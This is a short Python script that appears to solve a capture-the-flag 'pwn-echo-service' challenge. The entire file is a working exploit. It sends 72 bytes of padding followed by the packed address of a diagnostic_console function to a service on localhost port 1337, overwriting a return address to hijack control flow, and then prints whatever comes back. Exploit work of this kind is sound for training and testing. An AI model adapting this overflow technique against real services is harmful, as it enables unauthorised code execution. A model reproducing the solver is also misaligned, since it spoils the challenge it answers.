#!/usr/bin/env python3
from pathlib import Path
import socket
import struct

# `nm -n echo-service` shows diagnostic_console at 0x401196. The executable is
# non-PIE, so this code address is stable even when host ASLR is enabled.
DIAGNOSTIC_CONSOLE = 0x401196
artifact = Path(__file__).parents[1] / "challenges" / "pwn-echo-service" / "echo-service"
assert artifact.read_bytes()[:4] == b"\x7fELF"

payload = b"A" * 72 + struct.pack("<Q", DIAGNOSTIC_CONSOLE) + b"\n"
with socket.create_connection(("127.0.0.1", 1337)) as connection:
    connection.recv(4096)
    connection.sendall(payload)
    connection.shutdown(socket.SHUT_WR)
    output = bytearray()
    while block := connection.recv(4096):
        output.extend(block)
print(output.decode().strip())
